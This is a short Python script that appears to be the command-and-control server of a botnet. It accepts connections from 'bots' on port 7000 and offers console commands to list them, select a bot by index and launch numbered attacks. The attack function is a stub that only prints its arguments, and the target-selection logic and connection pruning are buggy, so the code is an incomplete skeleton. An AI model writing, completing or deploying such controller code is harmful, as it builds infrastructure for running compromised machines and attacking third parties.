#!/usr/bin/env python3
import socket
import threading

connections = []
addresses = []

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind(("172.31.21.91",7000))
s.listen()

def catcher(s):
    while True:
        conn, addr = s.accept()
        connections.append(conn)
        addresses.append(addr)
        print(f"[+] {addr[0]}:{addr[1]} added!")

def check_conns():
    for i in range(len(connections)): 
        try:
            connections[i].send("a".encode("utf-8"))
        except:
            connections.pop(i)

def send_attack(target,id_attack):
    print(target,id_attack)

def commands():
    while True:
        com = input(">>> ")
        if com == "":
            continue
        elif com == "help" or com == "h":
            print("COMMANDS")
            print("help\nlist\nselect\nattacks\noptions")
        elif com == "list" or com == "l":
            check_conns()
            for i in range(len(connections)):
                print(f"[{i}]\t{addresses[i][0]}:{addresses[i][1]}")
        elif com.split()[0] == "select" or com.split()[0] == "s":
            try:
                target = com.split()[1]
            except:
                print("[!] USE: s <bot index>")
        elif com.split()[0] == "attacks" or com.split()[0] == "a":
            if len(com.split()) != 2 or not com.split()[1].isdigit():
                print("[!] USE: a <attack index>")
                print("MODULE ATTACKS")
            else:
                try:
                    send_attack(target,com.split()[1])
                except:
                    print("[!] First select a target")
                continue

x = threading.Thread(target=catcher, args=(s,))
y = threading.Thread(target=commands)
x.start()
y.start()


